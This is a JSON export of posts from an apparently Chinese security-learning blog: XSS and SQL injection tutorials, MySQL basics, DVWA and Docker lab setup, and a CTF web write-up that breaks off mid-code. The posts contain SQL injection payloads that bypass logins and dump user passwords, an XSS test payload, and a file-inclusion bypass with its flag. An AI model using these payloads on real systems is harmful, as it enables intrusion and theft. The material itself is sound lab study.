[{"title":"XSS跨站脚本攻击","url":"/2022/12/24/XSS跨站脚本攻击/","content":"# XSS 基础\n## XSS 简介和原理\nXSS（Cross Site Scripting 跨站脚本攻击），指恶意攻击者通过向网站插入恶意payload或恶意脚本，从而盗取cookie、session信息以利用用户身份进行违规操作、盗取用户资料等等。\n\n其原理是攻击者在网页中嵌入客户端脚本（通常是JavaScript的恶意脚本），当用户使用浏览器加载**被嵌入恶意代码的网页**时，恶意脚本代码就会在**用户的浏览器**执行，造成跨站脚本攻击。\n\n## XSS 危害\n跨站脚本攻击可能会产生盗取（挟持）Cookie、网络钓鱼、植马挖矿、刷流量、劫持后台、篡改页面、内网扫描、制造蠕虫等。\n{% asset_img harm.png XSS危害 %}\n\n## 常出现的场景\n* 重灾区：评论区、留言区、个人信息、订单信息等\n* 针对性区域：站内信、网页即时通讯、私信、意见反馈等\n* 存在风险：搜索框、当前目录、图片属性等\n\n\n# XSS 类型\n## 反射型 XSS\n网站对于用户提交的数据没有进行过滤或转义操作（或者过滤、转义不足），导致攻击者嵌入的恶意代码被提交给服务端，服务端解析后，在相应内容中返回输入的XSS代码，最终由浏览器解释执行。\n\n* 反射型XSS 是**非持久性、参数性**的跨站脚本，恶意代码并**没有保存**在目标网站，而是通过引诱用户点击一个**链接到目标网站的恶意链接**来实施攻击。\n* 出现场景：多出现在搜索框或输入框\n\n原型如下：\n```\n<?php\necho 'your input:' . $_GET['input'];\n?>\n```\n\n若input为`<script>alert(/XSS/)</script>`\n且input值未经任何过滤便直接输出，则服务端解析后，echo语句会将客户端输入的代码**完整地输出到HTTP响应中，浏览器解析并执行**，从而实现弹窗。\n当然，攻击者可以直接以此构造url，当用户受惑点击该url链接，攻击就发生了。\n\n### 反射型XSS 利用流程\n{% asset_img re.png 反射型XSS利用原理 %}\n\n## 存储型 XSS\n反射型XSS每次皆需要用户提交代码（也即“点击”）才能进行攻击。而存储型XSS提交的XSS代码会**存储在服务器端**，下次请求该网页时无需再次提交XSS代码。常见的应用场景有留言板、在线聊天室、邮件服务或黑客的嵌入恶意JavaScript代码的博客文章等。\n\n当攻击者提交包含XSS代码的留言后，服务端会将其**存储在数据库中**，当其他用户访问网页查看留言时，服务端将从数据库中查询已有留言，并将其内容输出在HTTP响应中，由浏览器对包含恶意代码的响应解析并执行。\n\n原型如下：\n```\n<?php\nif( isset( $_POST[ 'btnSign' ] ) ) {\n    // Get input\n    $message = trim( $_POST[ 'mtxMessage' ] );\n    $name    = trim( $_POST[ 'txtName' ] );\n\n    // Sanitize message input\n    $message = stripslashes( $message );\n    $message = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $message ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n\n    // Sanitize name input\n    $name = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $name ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n\n    // Update database\n    $query  = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\";\n    $result = mysqli_query($GLOBALS[\"___mysqli_ston\"],  $query ) or die( '<pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );\n\n    //mysql_close();\n}\n?> \n```\n\n攻击者提交留言`<script>alert(/XSS/)</script>`后，XSS代码被保存在 数据库中，并且立即执行了一次查询，XSS代码直接被触发。\n当其他用户访问网页时，服务端都将从**数据库**中查询到该XSS代码，触发执行，从而被盗取cookie（sessionid）等信息。\n### 存储型XSS 利用流程\n{% asset_img sd.png 存储型XSS利用原理 %}\n\n## DOM XSS\n### DOM 简介\n* DOM，全称Document Object Model(文档对象模型)，是W3C推荐的一种独立于平台和语言的标准，定义了**访问HTML和XML文档的标准**。\n* Dom即Window对象下内置的document对象\n{% asset_img dom.png dom %}\n\ndocument对象提供了非常多的操作方式，我们可以通过document对象实现对网页内容的一些操作如文本的修改、属性的修改、元素的获取等。\n\n与反射型 XSS不同，DOM XSS不需经由服务器的响应、处理\n{% asset_img DOM1.png DOM原理 %}\n\n* DOM-XSS基于前端做的一些限制和筛选，对当前页面做一些直接化的修改。简单去理解就是输出点在DOM，属于特殊的反射型XSS。\n\n**常见的DOM方法**\n\n{% asset_img dom2.png DOM方法 %}\n\n### DOM-XSS 利用流程\n其利用与反射型XSS十分相似，不再赘述。但需要注意：由于前端的限制，我们需要在**URL中输入XSS探测脚本**。\n\n## 三种类型的比较\n|XSS类型|存储型|反射型|DOM型|\n|:--:|:--:|:--:|:--:|\n|触发过程|1、黑客构造XSS脚本<br>2、正常用户访问携带XSS脚本的页面|正常用户访问携带XSS脚本的URL|正常用户访问携带XSS脚本的URL|\n|数据存储|服务器|URL|URL|\n|谁来输出|后端Web应用程序|后端Web应用程序|前端JavaScript|\n|输出位置|HTTP响应中|HTTP响应中|动态构造的DOM节点中|\n|是否持久|是|否|否|\n\n# 防御手段\n> 对用户的输入进行合理验证\n\n对 `(`, `<` , `>` , `'` , `\"` 等特殊字符以及 `<script>`, `javascript` 等字符串进行过滤\n> 根据数据位置设置恰当的输出编码\n\n根据数据将要至于HTML上下文中的不同位置(HTML标准、HTML属性、\nJavascript脚本、CSS、URL)，对所有不可信数据进行恰当的输出编码\n> 设置HttpOnly属性\n\n避免攻击者利用XSS属性进行Cookie劫持攻击。\n","tags":["web","渗透","常见漏洞"],"categories":["渗透：从0到1"]},{"title":"SQL注入","url":"/2022/12/15/SQL注入/","content":"# SQL注入原理\n## SQL注入产生的原因\n当Web应用向后台数据库传递**SQL语句**进行数据库操作时，如果用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。\n\n## SQL注入的本质\n把用户输入的数据**当作代码来执行**，违背了“**数据与代码分离**”的原则。\n## SQL注入的关键点\n1. 用户能够控制输入的内容；\n2. Web应用把用户输入的内容带到数据库中执行\n\n#  SQL注入的危害\n1. 盗取网站的敏感信息\n2. 绕过后台认证\n```\n后台登录语句\nselect * from admin where username = 'admin' and password = 'password'\n万能密码\n' or '1' = '1' #\n```\n3. 借助SQL注入漏洞提权获取系统权限\n4. 读取文件信息\n\n# SQL注入的分类\n1. 根据诸如位置分类：GET型、POST型、Head头注入\n2. 根据反馈结果分类：有回显、无回显\n\n    Ⅰ. 有回显\n    * 可以联合查询的注入\n    * 报错注入\n    * 通过注入进行DNS请求，从而达到可回显的目的\n    \n    Ⅱ. 无回显\n    * Bool盲注\n    * 时间盲注\n3. 根据数据类型分类：数字型（输入的参数为整型，如id、年龄、页码等），字符型（输入的参数为字符串）\n\n数字型与字符型最大的区别在于：数字型不需要单引号闭合，而字符型一般需要单引号闭合。\n\n另外还需注意**二次注入**，一般需要自己编写代码以实现自动化注入。\n\n# SQL注入的流程\n## 注入点的位置及发现\nSQL注入需要寻找**与数据库有关联**的请求。常见的注入点不一定是表单中的username字段，有时候注入点还会隐藏在不同的地方，下面我们来介绍几个常见的注入点的位置。\n* **GET参数中的注入：**\nGET中的注入点一般最容易发现，因为我们可以在地址栏获取URL和参数等，可以用**Sqlmap或者手工验证**是否存在注入。\n* **POST中的注入：**\nPOST中的注入点一般需要我们通过**抓包操作**来发现，如使用Burp或Hackbar来发送POST包。同样也可以使用**Sqlmap或者手工验证**。\n* **User-Agent中的注入：**\n在希望发现User-Agent中的注入时，可以使用Burp中的Repeater模块，或者Sqlmap。将Sqlmap的参数设置为：`level=3`，这样Sqlmap会自动检测User-Agent中是否存在注入。\n* **Cookie中的注入：**\n想要发现Cookie中的注入， 可以使用Burp中的Repeater模块，或者Sqlmap。将Sqlmap的参数设置为：`level=2`，这样Sqlmap会自动检测Cookie中中是否存在注入。\n\n## 判读注入点是否存在\n在判断输入点是否存在注入时，可以先假设原程序执行的SQL语句，如\n```\nSELECT UserName FROM User WHERE id = '$id';    // 参数为字符串\n或\nSELECT UserName FROM User WHERE id = $id;   // 参数为数字\n```\n\n然后通过以下几种方法进行判断：\n* **插入单引号：**\n插入单引号是我们最常用的检测办法，原理在于未闭合的单引号会引起**SQL语句单引号未闭合**的错误\n* **数字型判断：** \n通过 `or 1=1` （数字型）和闭合单引号的测试语句 `'or '1'='1` 进行判断，这里采用Payload `'1'='1` 的目的是**闭合原语句后方的单引号**，也可以选择`'1'='1'#`注释掉后面的单引号\n* **通过数字的加减判断：** \n比如，我们在遇到的题目中抓到了链接 `http://example.com/?id=2` 就可以进行如下的尝试 `http://example.com/?id=3-1` . 如果二者结果相同，则证明id这个输入点可能存在SQL注入漏洞\n\n## *判断闭合方式\n```\n?id=1cccc\n```\n\n有报错：数字型，无闭合或用 `)` 闭合\n\n无报错：字符型，再用： `'` , `\"` , `')` , `\")` 根据报错信息判断\n\n## 判断字段数（列数）及回显位\n```\n?id=1' order by 3#\n?id=1' order by 2#\n```\n利用SQL的特性，当查询时`order by`后的数字大于列数时就会报错，根据这一点可判断列数（借助二分法可快速判断）\n\n{% asset_img 3.png order_by_3 %}\n\n`order by 3`时报错，`order by 2`时不报错，表名为两个字段。\n\n{% asset_img 2.png order_by_2 %}\n\n## UNION 联合查询\nUNION关键字，联合查询，可以实现将两个select语句合并为一条语句，并显示为一个结果。\n\n{% asset_img union.png 联合查询 %}\n\n需要注意，联合查询下，两个select语句所查询的表一定为**相同字段数量**！\n\nMySQL基础查询语法告诉我们查询**系统当前使用的数据库名称**的方法：\n```\nselect database();  // 查询查询当前数据库名称\n```\n\n而如果培训和`union`联合查询，必须构造**相同字段数**：\n```\nselect 1, database();   // 两个字段\nselect 1, 2, database();    // 三个字段\n```\n\n{% asset_img 数据库名.png 联合查询数据库名 %}\n\n利用这一点，可以联合查询出数据库名：\n\n{% asset_img 靶场数据库名查询.png 联合查询数据库名 %}\n\n并且可以知道，第一个字段的值将会显示在`First name`处，第二个字段的值将会显示在`Surname`处。\n\n接下来我们需要查询数据库的表有什么内容，这将会利用这个自带的数据库来查询表名—— `information_schema` , 在该数据库中存在 `tables` 表， 提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。\n```\nselect id from test.students;    //跨数据库查询test库中的students表的id字段(只显示id这一列)\nselect table_name from information_schema.tables; //查询所有的表名\nselect table_name from information_schema.tables where table_schema='dvwa';    //查询数据库dvwa的中的所有表名\n```\n\n由此构造联合查询sql语句，payload如下：\n```\n0' union select 1, table_name from information_schema.tables where table_schema='dvwa'#  //后面的'#可去掉\n```\n\n{% asset_img tablenames.png 联合查询表名 %}\n\n由此获得目的数据库中的所有表的表名。由于字段数未知，还需要借助 `information_schema` 的 `COLUMNS` 表，该表提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。\n```\nselect column_name from information_schema.columns where table_name='users';    //查询users表的所有列名\n# 注入payload\n0' union select 1, column_name from information_schema.columns where table_name='users\n# group_concat(column_name) 使在一条记录中显示\n0' union select 1, group_concat(column_name) from information_schema.columns where table_name='users\n```\n\n{% asset_img c.png 联合查询列名 %}\n\n由此得到了数据库名、表名、列名，就可以配合select查询语句，获取每一条记录的内容\n```\n0' union select user, password from users#\n```\n\n{% asset_img 账号密码.png 查询结果 %}\n\n","tags":["web","渗透"],"categories":["渗透：从0到1"]},{"title":"数据库基础","url":"/2022/12/13/数据库基础/","content":"# 数据库\n## 数据库基本概念\n数据库(database)就是一个由一批数据构成的有序集合，这个集合通常被保存为一个或多个**彼此相关**的文件。通俗的讲，数据库就是软件存放数据的一个空间，而数据中有很多都是有关联的。\n\n用户可以对文件的数据进行新增、截取、更新、删除等操作。\n\n## 数据库管理系统(DBMS)\n数据库管理系统（DBMS, 后面简称数据库）是一种操纵和管理数据库的软件，用于建立、使用和维护数据库。它对数据库进行统一的管理和控制，以保证数据库的安全性和完整性。\n\n数据库主要分为两类：**关系型数据库**和**非关系型数据库**\n\n关系型数据库：存储格式能直观反映实体间的关系，和**创建的表格**比较相似，表与表之间有着复杂的关联关系。有MySQL, Oracle, Microsoft SQL Server, Access等。\n>举个例子，通过Stuuupid这个用户，可以将他的“个人信息”“博客信息”“联系方式”这三张表的数据关联起来，那么就可以把这个用户Stuuupid这个用户作为关键点，把上述其他三张表的数据一起查出来。这就是关系型数据库。\n\n非关系型数据库：分布式、非关系型的、不保证遵循ACID原则的数据存储系统。有MongoDB, Redis, HBase等。\n\n## SQL基础\n**SQL(Structured Query Language)** , 结构化查询语言，这种语言已发展为人们在构造数据库查询命令的一个标准。\n\n**查询**是人们用各种SQL指令构造出来的，SQL指令负责具体完成筛选和提取结果数据的工作。基本的指令如增、删、改、查等。\n\n# MySQL基础\n## 数据库结构\n\n{% asset_img mysql1.png 数据库结构 %}\n\n数据库中的数据是存储在数据库**表**中，如上图为数据库的**基本表结构**（类似Excel表格），每一个不同的表汇总起来就构成一个数据库。\n## 数据类型\nMySQL中定义数据字段的类型对数据库的优化是非常重要的。\n\nMySQL支持多种数据类型，大致可以分为三类：数值、日期/时间和字符(串)类型。\n### 数值类型\n包括小整数值、**大整数值(INT)** 、极大整数值、**单精度浮点数值(FLOAT)** 、**双精度浮点数值(DOUBLE)** 、小数值等。\n{% asset_img datatype.png 数值数据类型 %}\n### 日期/时间类型\n|类型|大小(bytes)|范围|格式 |用途|\n|:---|:---:|:---|:---:|:---:|\n|DATE   |3             |1000-01-01/9999-12-31  |YYYY-MM-DD |日期值|\n|TIME   |3              |'-838:59:59'/'838:59:59'|HH:MM:SS    |时间值或持续时间|\n|YEAR |1                |1901/2155                 |YYYY|年份值|\n|DATETIME|8|1000-01-01 00:00:00/9999-12-31 23:59:59|YYYY-MM-DD HH:MM:SS| 混合日期和时间值\n|TIMESTAMP|4|1970-01-01 00:00:00/2038<br>结束时间是第 2147483647 秒，北京时间 2038-1-19 11:14:07，格林尼治时间 2038年1月19日 凌晨03:14:07|YYYYMMDD HHMMSS|混合日期和时间值，时间戳|\n\n### 字符(串)类型\n{% asset_img char.png 字符类型 %}\n尤其需要记住的是**定长字符串(CHAR)**和**变长字符串(VARCHAR)**\n\n## MySQL约束类型\n约束，对表中的数据进行限定，保证数据的正确性、有效性、完整性。\n>1 主键约束(primary key)：保证该字段具有**非空且唯一性**，一张表中只能有一个主键，主键是表中字段的唯一标识。\n\n**主键约束** 是使用最频繁的约束。在设计数据表时，一般情况下，都会要求表中设置一个主键。\n主键是表的一个特殊字段，该字段能唯一标识该表中的每条信息。例如，学生信息表中的学号是唯一的。\n\n**单一主键**\n使用一个列作为主键列，当该列的值有重复时，则违反唯一约束。\n\n**联合主键**\n使用多个列作为主键列，当多个列的值都完全相同时，则违反唯一约束。\n\n**主键自增长**\nMySQL 中的自动增长类型要求：\n1.一个表中只能有一个列为自动增长。\n2.自动增长的列的类型必须是整数类型。\n3.自动增长只能添加到具备主键约束与唯一性约束的列上。\n4.删除主键约束或唯一性约束，如果该列拥有自动增长能力，则需要先去掉自动增长然后在删除约束。\n```\nalter table <table_name> add primary key(<列字段名>)\nalter table <table_name> drop primary key\n```\n\n\n>2 非空约束(not null)：保证字段不能为空\n\n```\nalter table <table_name> change column <字段名> <数据类型> not NULL\n```\n\n>3 唯一约束(unique)：保证该字段具有唯一性但可以是null\n\n```\nalter table <table_name> add constraint <约束名> unique(<列名>)\nalter table <table_name> drop key <约束名>\n```\n\n\n>4 外键约束(foreign key)：在一个表中存在的另一个表的主键或唯一键\n\n外键约束经常和主键约束一起使用，用来确保数据的一致性。\n```\nalter table <table_name> add constraint <外键名> foreign key(<列名>) references <参照的表名>(<参照的列名>)\nalter table <table_name> drop foreign key <外键名>\n```\n\n>5 默认约束(default+默认值)：用于保证该字段有默认值(用引号引起来)\n\n```\nALTER TABLE <数据表名>\nCHANGE COLUMN <字段名> <数据类型> DEFAULT <默认值>\n```\n\n详细学习可以去其他网站寻找教程。\n\n## 常见的MySQL语句\n\n1. 连接到数据库\n```\nmysql -uroot -p\n```\n\n`-u`后加用户名，`-p`表示需要输入密码，enter输入密码即可成功连接到MySQL。\n\n2. 查看所有的数据库\n```\nshow databases; // 注意加分号;表示该句结束\n```\n\n3. 创建数据库\n```\ncreate database <库名>;\n```\n\n4. 删除数据库\n```\ndrop database <库名>;\n```\n\n5. 查看当前数据库的表\n```\nuse <库名>  // 指定数据库\nshow tables;\n```\n\n6. 查看某个表的字段描述\n```\ndesc <表名>;\n```\n\n### 增、删、改、查\n1. 增\n```\n// 插入数据\ninsert into <表名>(<字段1>, <字段2>...) values(<值1>,<值2>...);\n// 插入多条数据\ninsert into <表名>(<字段1>, <字段2>...) values(<值01>,<值02>...),(<值11>,<值12>...);\n```\n2. 改\n```\nupdate <表名> set <字段名>=<修改值> where <条件>;\nupdate <表名> set <字段名>=<修改值> where <字段名>=<值>;\n// 例:将字段id=460061的那条数据的字段name的值修改为'Alen'\n// update students set name='Alen' where id = 460061;\n```\n\n这里相当于用` where` 来索引要去修改的地方，`where` 后面为`条件`。\n{% asset_img 增改.png 增改实例 %}\n\n3. 删\n数据库中的删除：\n`delete` 表示删除一条数据。指定**物理删除**，将数据从表中彻底抹除。\n除此之外，还有**逻辑删除**，用户看起来删掉了，但实际上该数据仍在存在于数据库中，只是不显示而已。逻辑删除通常通过`update` 修改某个字段的值来实现。\n```\ndelete from <表名> where <条件>;\n```\n\n4. 查\n```\nselect * from <表名> [where <条件>];  // where条件可选，若不加，则查询表中所有数据\n```\n{% asset_img select.png 查询数据 %}\n\n### 高级查询\n1. 排序\n```\nselect * from <表名> order by <字段名> [asc];  //默认升序\nselect * from <表名> order by <字段名> desc;    //降序\n```\n\n{% asset_img order.png 查询数据 %}\n\n另外，也可以不通过`字段名`来实现`order by` ，而是通过`数字` 表示第几个字段（第几列）来实现。\n```\nselect * from <表名> order by 1;  //按第一列升序\n```\n\n>当后面的`数字`**大于总字段数**时，就会报错。可在“sql注入”中利用这一特性来判断表的字段数。\n{% asset_img num.png 用num查询排序 %}\n\n2. LIMIT限制\n```\nselect * from <表名> LIMIT [<偏移量>, ]<限制条数>;\n// 例:检索前2个记录行，偏移量默认为1\n// select * from students LIMIT 2;\n// 例:检索记录行2-4\n// select * from students LIMIT 2,3;  //可以理解为从第二行开始，检索3个记录行\n```\n\n### 注释符\nMySQL有三种注释方式:\n```\n1. #\n2. --+ 或 --  //后面要加空格\n3. /**/\n```\n\n### 其他操作\n版本信息\n```\nselect version();\nselect @@version;\n```\n\n返回当前使用数据库的用户，也就是网站配置文件中连接数据库的账号\n```\nselect user();\n```\n\n连接数据库的用户名\n```\nselect session_user();\n```\n\n系统用户名\n```\nselect system_user();\n```\n\n## MySQL特性\n`information_schema`<br>\nMySQL 5.0 以上版本自带 information_schema这个数据库，其保存着其他数据库的信息。\n\n{% asset_img ins.png information_schema %}\n\n关于这个数据库，后续会继续学习补充。","tags":["web","渗透"],"categories":["渗透：从0到1"]},{"title":"web基础和靶场搭建","url":"/2022/12/12/web基础和靶场搭建/","content":"\n# Web安全\nWeb是互联网的总称，全称即World Wide Web， 缩写为WWW，全球广域网，也称为万维网，它是一种基于超文本和HTTP的、全球性的、动态交互的、跨平台的分布式图形信息系统。简单来说，Web是一种体系结构，通过它可以访问遍布于因特网主机上的连接文档。\nweb安全简单来说就是网站的安全，那么我们需要学习的是，网站上可能出现哪些漏洞（常见漏洞类型和原理），如何**寻找**这些漏洞，如何**利用**这些漏洞。本文可以作为“渗透：从0到1”的先导篇目。\n\n# 漏洞挖掘\n## 漏洞定义\n对于漏洞的官方定义：漏洞是在硬件、软件、协议的具体实现或系统安全策略上存在的缺陷，从而使攻击者能在未授权的情况下访问或破坏系统。通俗的讲，只要可以给厂商带来损失的都可以被叫做漏洞。\n\n{% asset_img 漏洞挖掘.png 漏洞挖掘 %}\n\n## 漏洞类型(OWASP Top 10 2021 and part of Top 10 2017)\n|    |      |\n|:---:|:---|\n|A01 | 2021-失效的访问控制(Broken Access Control) |\n|A02 | 2021-加密机制失败(Cryptographic Failures) |\n|A03 | 2021-注入(Injection) |\n|A04 | 2021-不安全设计(Insecure Design) |\n|A05 | 2021-安全配置错误(Security Misconfiguration) |\n|A06 | 2021-自带缺陷和过时的组件(Vulnerable and Outdated Components) |\n|A07 | 2021-身份识别和身份验证错误(Identification and Authentication Failures) |\n|A08 | 2021-软件和数据完整性故障(Software and Data Integrity Failures) |\n|A09 | 2021-安全日志和监控故障(Security Logging and Monitoring Failures) |\n|A10 | 2021-服务端请求伪造(Sever-Side Request Forgery) |\n|A03|2017-敏感信息泄露(Sensitive Data Exposure)|\n|A07|2017-跨站脚本攻击(XSS)|\n|A08|2017-不安全的反序列化|\n|A09|2017-使用含有已知漏洞的组件|\n|A10|2017-不足的日志记录和监控|\n\n不难发现，许多CTF比赛的web题就是从这些漏洞中出题，因此必须对常见的漏洞进行具体细致的了解，这也是“挖洞”的基础。\n\n# 漏洞靶场之DVWA\nDVWA是OWASP官方编写的PHP网站，包含了各种网站常见漏洞，可以学习攻击及修复方式。关于靶场的搭建，可以用源码配合phpStudy小皮面板实现（市面上有许多种类的靶场，另一个我正在学习使用的就是pikachu），具体步骤可参考如下过程：\n## DVWA的安装\n>1 下载安装 phpStudy 和 DVWA源码\n\n可以根据需要，下载合适版本的phpStudy.\n\nphpStudy下载地址:[phpStudy](https://www.xp.cn/download.html)\n\n接下来获取DVWA靶场源代码.\n\nDVWA源代码下载地址1:[DVWA源码](https://github.com/digininja/DVWA/archive/master.zip)\n\nDVWA源代码下载地址2:[DVWA源码](https://github.com/ethicalhack3r/DVWA/archive/master.zip)\n\n>2 将解压后的DVWA源代码放置phpStudy的安装目录**WWW文件夹**中(有时需要修改源代码文件夹名dvwa-master为DVWA)\n\n>3 进入DVWA/config目录，将config.inc.php.dist中的dist删去\n\n>4 打开刚刚重命名的config.inc.php文件，修改db_user和db_password  //默认改为root root\n\n{% asset_img 修改配置实例.png 示例 %}\n\nDVWA在创建的时候需要在本地安装创建一个数据库(database)，也就意味着需要连接到本地已有的MySQL的数据库的软件，然后再用这个软件去创建一个DVWA的数据库。因此，其需要MySQL账号密码授权。这里我没有使用phpStudy的MySQL，而是使用本地自己安装的MySQL，用户名为root，密码为123@hui.\n如下图生成一个数据库\n\n{% asset_img database.png database示例 %}\n\n而对于phpStudy中集成的MySQL服务的账号密码默认为root和root，故若使用phpStudy中的MySQL，需要将修改db_user和db_password为root和root.\n\n\n>5 浏览器访问http://localhost/DVWA/setup.php, 点击最下方的Create Database.\n\n>6 浏览器访问http://localhost/DVWA/, 输入用户名admin，密码password，登录DVWA即可。\n\n## DVWA的使用\n在DVWA Security中可以手动调整靶机源码的安全级别，分别为 Low，Medium，High，Impossible，级别越高，安全防护越严格，渗透难度越大。一般 Low 级别基本没有做防护或者只是最简单的防护，很容易就能够渗透成功；而 Medium 会使用到一些非常粗糙的防护，需要使用者懂得如何去绕过防护措施；High 级别的防护则会大大提高防护级别，一般 High 级别的防护需要经验非常丰富才能成功渗透；最后 Impossible 基本是不可能渗透成功的，所以 Impossible 的源码一般可以被参考作为生产环境 Web 防护的最佳手段。\n\nDVWA 一共包含了十个攻击模块，分别是：Brute Force（暴力（破解））、Command Injection（命令行注入）、CSRF（跨站请求伪造）、- File Inclusion（文件包含）、File Upload（文件上传）、Insecure CAPTCHA （不安全的验证码）、SQL Injection（SQL注入）、SQL Injection（Blind）（SQL盲注）、XSS（Reflected）（反射型跨站脚本）、XSS（Stored）（存储型跨站脚本）。包含了 OWASP TOP10 的所有攻击漏洞的练习环境，一站式解决所有 Web 渗透的学习环境。\n\n# Docker基础\nDocker，即“容器”，便于环境的移植、安装和管理，并且具有很高的安全性。容易想象，如果用以上的办法部署DVWA靶场，当靶场被攻击时，本地将会是非常危险的。\n## 认识Docker\nDocker是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的Linux或Windows操作系统的机器上，也可以实现虚拟化。容器是**完全使用沙箱机制，相互之间不会有任何接口**\n\n## Docker安装和配置\n这里在kali-linux-2022.1操作系统中进行Docker的安装和配置。\n### 查看系统信息和内核版本\n\n```\nuname -a  # 显示系统信息\nuname -v  # 显示内核版本\n```\n\n{% asset_img 版本内核.png 系统信息和内核版本 %}\n\n### 更换apt源\n默认的源在国外，我们通过这个源去下载时耗时将会很久，换源可以提高效率。\n\n```\nsudo vim /etc/apt/sources.list  # apt源路径: /etc/apt/sources.list\n```\n\n按`i`进入编辑模式，从以下国内源中选择一个复制进去然后按`esc`键输入`:wq`保存退出。\n\n```\n#中科大\ndeb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\ndeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\n#阿里云\n#deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib\n#deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib\n#清华大学\n#deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free\n#deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free\n#浙大\n#deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free\n#deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free\n#东软大学\n#deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib\n#deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib\n#重庆大学\n#deb http://http.kali.org/kali kali-rolling main non-free contrib\n#deb-src http://http.kali.org/kali kali-rolling main non-free contrib\n```\n\n感谢CSDN博主「卑微的那菈」整理的2022年全新kali国内源 [KALI更换国内源（2022年全新）](https://blog.csdn.net/fingue/article/details/127096363)\n\n这里我使用的是中科大的源\n\n{% asset_img 换源.png 换源 %}\n\n之后更新apt源即可。\n```\nsudo apt-get update\n```\n\n### Docker安装和验证\n```\nsudo apt-get install -y docker docker-compose   # 安装docker和docker-compose，-y表示默认全部yes\n``` \n\n待安装完成后，可用以下命令查看版本信息，以验证docker是否安装成功。\n```\ndocker --version # 查看版本\ndocker-compose --version # 查看版本\n```\n\n{% asset_img docker.png docker安装验证 %}\n\n### 启停管理\n```\nsudo systemctl start/stop/restart docker # 启动、停止、重启docker\n```\n\n通过以上命令即可以实现Docker的启停。\n### 配置加速器\n使用Docker的时候，需要经常从官方获取镜像，但是由于网络原因，拉取镜像的过程非常耗时，严重影响Docker的使用。因此可以通过配置加速器来解决。\n\n```\n# 添加一个daemon.json\nsudo vim /etc/docker/daemon.json\n# 将以下镜像注册copy进daemon.json中\n{ \"registry-mirrors\": [\n    \"https://dockerhub.azk8s.cn\",\n    \"https://reg-mirror.qiniu.com\",\n    \"https://1rqfztnd.mirror.aliyuncs.com\"\n  ]\n}\n```\n\n写入daemon.json文件后，下面使加速器生效。\n```\nsudo systemctl daemon-reload  # 重新加载配置文件\nsudo systemctl restart docker # 重启docker\n```\n\n## Docker安装、运行DVWA靶场\n```\nsudo docker search dvwa # 搜索DVWA\nsudo docker pull citizenstig/dvwa # 拉取安装指定dvwa\nsudo docker run --rm --name dvwa -it -p 8888:80 citizenstig/dvwa  # docker运行dvwa\nnetstat -ntulp | grep 8888  # 查看容器指定端口是否被打开\n访问 http://localhost:8888 进行dvwa的访问\n```\n\n>注：容器在运行时会生成一个镜像，镜像在生成后会处于几种状态：运行中和已停止，`--rm`命令使镜像在停止之后自动删除。需要保留镜像时就可以不加该参数；`--name dvwa`为镜像起名为dvwa；`-p`可理解为端口的映射，即把外部的8888端口映射镜像的80端口，通过访问外部8888端口，即可访问到80端口。\n\n{% asset_img re.png %}\n\n","tags":["web","渗透"],"categories":["渗透：从0到1"]},{"title":"2022Dest0g3 520迎新赛 web（1~5题）","url":"/2022/12/06/2022Dest0g3-520迎新赛-web（1-5题）/","content":"\n# phpdest\n\n放出源码：\n```\n<?php\nhighlight_file(__FILE__);\nrequire_once 'flag.php';\nif(isset($_GET['file'])) {\n    require_once($_GET['file']);\n}\n```\n\n这一次是对`require_once()`函数的考查，其调用时php会检查该文件是否已经被包含过，如果是则不会再次包含，于是我们必须想办法绕过这个机制，从而实现再次包含文件flag.php.\n\n上一次我们学习到php伪协议，结合下面这个知识点\n\n```\n/proc/self指向当前进程的/proc/pid/，/proc/self/root/是指向/的符号链接\n```\n\n我们就可以用伪协议配合多级符号链接的办法进行绕过，直接构造payload：\n\n```\n?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php\n```\n\nGET传参成功\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220824214540576-494053270.png\" width=500>\n转码后成功得到flag.\n`flag = \"Dest0g3{ef8f9913-9d91-4c88-9773-0810a40f8ad8}`\n[资料查阅：[require_once 绕过不能重复包含文件的限制](https://www.anquanke.com/post/id/213235)]\n\n***\n\n# EasyPHP\n\n依旧给出源码：\n\n```\n<?php\nhighlight_file(__FILE__);\ninclude \"fl4g.php\";\n$dest0g3 = $_POST['ctf'];\n$time = date(\"H\");\n$timme = date(\"d\");\n$timmme = date(\"i\");\nif(($time > \"24\") or ($timme > \"31\") or ($timmme > \"60\")){\n    echo $fl4g;\n}else{\n    echo 